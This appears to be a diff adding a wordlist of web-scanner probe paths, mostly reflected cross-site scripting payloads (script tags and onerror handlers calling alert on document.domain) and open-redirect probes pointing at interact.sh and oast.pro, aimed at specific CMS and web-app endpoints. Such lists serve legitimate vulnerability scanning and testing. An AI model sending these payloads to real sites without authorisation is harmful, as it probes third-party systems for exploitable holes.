@@ -1,0 +1,17 @@
+/index.php?currentpath=%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+/go.php?http://interact.sh
+/index.php?m=search&c=index&a=initxqb4n<img%20src%3da%20onerror%3dalert(document.domain)>cu9rs&modelid=1&q=tes
+/login/?uid=%22%3E%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E
+/?uid=%22%3E%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E
+/mods/clansphere/lang_modvalidate.php?language=language&module=module%22></script><script>alert(document.domain)</script>
+/index.php?m=user&c=Users&a=logout&referurl=https://interact.sh
+/widgets/debug.php?a=<script>alert(document.domain)</script>
+/plugins/web/service/search/auto-completion/domain/en.xml?q=adm
+/loginsave.php?u=http://interact.sh
+/squid.svg?title=Not%20Found&text=This%20is%20not%20the%20page%20you%20are%20looking%20for!&background=%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E%3Cimg%20src=%22&small
+/default.aspx?years=http://oast.pro
+/ccm/system/panels/page/preview_as_user/preview?cID=
+/index.php?m=user&c=Users&a=logout&referurl=https://example.com
+/shop.php?search=%22/%3E%3Cscript%3Ealert(document.domain)%3C/script%3E
+/specification/report.php?q=%22%3E%3Cimg%20src=x%20onerror=prompt(document.domain)%3E
+/?xmlcontrol=body%20onload=alert(document.domain)
